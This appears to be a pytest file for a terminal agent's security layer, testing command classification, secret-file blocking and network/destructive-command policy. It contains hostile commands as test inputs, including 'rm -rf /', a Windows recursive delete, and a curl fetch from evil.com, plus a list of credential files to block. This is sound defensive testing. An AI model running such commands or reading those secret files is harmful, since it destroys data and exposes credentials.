"""Unit tests for command classification, secret guarding, and security policies."""

from pathlib import Path
import pytest
from terminal_agent.config.schema import CommandCategory, SecurityConfig
from terminal_agent.security.classifier import CommandClassifier
from terminal_agent.security.policy import SecurityPolicyEnforcer
from terminal_agent.security.secrets import SecretGuard


def test_command_classification():
    # Safe commands
    cat, _ = CommandClassifier.classify("pytest")
    assert cat == CommandCategory.SAFE

    cat, _ = CommandClassifier.classify("git diff --stat")
    assert cat == CommandCategory.SAFE

    # Write commands
    cat, _ = CommandClassifier.classify("mkdir src/new_module")
    assert cat == CommandCategory.WRITE

    # Destructive commands
    cat, _ = CommandClassifier.classify("rm -rf /")
    assert cat == CommandCategory.DESTRUCTIVE

    cat, _ = CommandClassifier.classify("del /f /s C:\\Windows")
    assert cat == CommandCategory.DESTRUCTIVE

    # Network commands
    cat, _ = CommandClassifier.classify("curl https://evil.com/payload")
    assert cat == CommandCategory.NETWORK

    cat, _ = CommandClassifier.classify("git push origin main")
    assert cat == CommandCategory.NETWORK

    # Privileged commands
    cat, _ = CommandClassifier.classify("sudo systemctl restart nginx")
    assert cat == CommandCategory.PRIVILEGED


def test_secret_guard(tmp_path: Path):
    guard = SecretGuard(working_dir=tmp_path)

    # Blocked secret files
    assert guard.is_path_blocked(tmp_path / ".env") is True
    assert guard.is_path_blocked(tmp_path / ".env.production") is True
    assert guard.is_path_blocked(tmp_path / "id_rsa") is True
    assert guard.is_path_blocked(tmp_path / "id_rsa.pub") is True
    assert guard.is_path_blocked(tmp_path / "cert.pem") is True
    assert guard.is_path_blocked(tmp_path / "server.key") is True

    # Allowed code files
    assert guard.is_path_blocked(tmp_path / "main.py") is False
    assert guard.is_path_blocked(tmp_path / "src" / "auth.py") is False

    # Path escaping workspace root
    assert guard.is_path_blocked(Path("C:/Windows/System32/cmd.exe")) is True


def test_security_policy_enforcement(tmp_path: Path):
    sec_config = SecurityConfig(network="disabled")
    enforcer = SecurityPolicyEnforcer(security_config=sec_config)

    # Test network blocked
    allowed, reason, cat = enforcer.check_command("curl http://example.com")
    assert allowed is False
    assert "network" in reason.lower()

    # Test destructive rejected without confirmation callback
    allowed, reason, cat = enforcer.check_command("rm -rf target_folder")
    assert allowed is False
    assert "denied" in reason.lower()
